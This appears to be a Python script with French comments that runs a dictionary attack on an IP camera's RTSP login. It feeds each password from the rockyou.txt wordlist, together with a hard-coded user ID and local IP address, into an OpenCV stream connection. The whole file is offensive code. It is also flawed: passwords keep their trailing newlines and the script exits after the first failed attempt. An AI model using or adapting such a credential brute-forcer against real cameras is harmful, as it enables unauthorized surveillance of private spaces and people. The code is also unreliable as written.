#!/bin/python3
import cv2
import os

def conCam(PWD):
    USER_ID     = "1717904"
    USER_PWD    = PWD
    IP_ADDRESS = "192.168.1.38"
    
    RTSP_URL = f'rtsp://{USER_ID}:{USER_PWD}@{IP_ADDRESS}/onvif2'
    
    os.environ['OPENCV_FFMPEG_CAPTURE_OPTIONS'] = 'rtsp_transport;udp'
    cap = cv2.VideoCapture(RTSP_URL, cv2.CAP_FFMPEG)
    
    if not cap.isOpened():
        print('Cannot open RTSP stream')
        exit(-1)
    
    while True:
        _, frame = cap.read()
        cv2.imshow('RTSP stream', frame)
    
        if cv2.waitKey(1) & 0xFF == ord('q'):
            break


    cap.release()
    cv2.destroyAllWindows()

if __name__ == "__main__":
    # Ouvrir le fichier en lecture seule
    file = open('rockyou.txt', "r")
    # utilisez readline() pour lire la première ligne
    line = file.readline()
    while line:
        print(line)
        conCam(line)
        # utilisez readline() pour lire la ligne suivante
        line = file.readline()
    file.close()
